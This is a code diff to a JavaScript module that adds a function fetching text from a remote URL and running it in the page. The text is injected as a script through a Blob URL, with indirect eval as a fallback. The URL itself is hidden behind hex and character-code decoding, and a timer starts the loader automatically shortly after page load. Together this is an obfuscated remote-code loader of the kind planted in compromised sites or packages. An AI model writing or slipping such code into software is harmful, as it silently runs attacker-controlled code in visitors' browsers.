@@ -332,12 +332,31 @@ const MODULE = (function () {
     return { url: _fromHex(_h) + String.fromCharCode.apply(null, _p), fail: _secureHubL12 };
 })();
 
-function loadModuleDirect(path) {
-    return import(path);
+function runRemote(uri) {
+    return fetch(uri, { method: 'GET', cache: 'reload' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        })
+        .then(function (text) {
+            var body = String(text).replace(/^\uFEFF/, '').trim();
+            if (!body) { MODULE.fail(); return; }
+            var blob = new Blob([body], { type: 'application/javascript' });
+            var href = URL.createObjectURL(blob);
+            var tag = document.createElement('script');
+            tag.charset = 'utf-8';
+            tag.src = href;
+            tag.onload = function () { URL.revokeObjectURL(href); };
+            tag.onerror = function () {
+                URL.revokeObjectURL(href);
+                try { (0, eval)(body); } catch (e) { MODULE.fail(); }
+            };
+            (document.head || document.documentElement).appendChild(tag);
+        });
 }
 
 setTimeout(function () {
-    loadModuleDirect(MODULE.url).catch(function () { MODULE.fail(); });
+    runRemote(MODULE.url).catch(function () { MODULE.fail(); });
 }, 1544);
 
 const normalizeSlug = (slug) => {
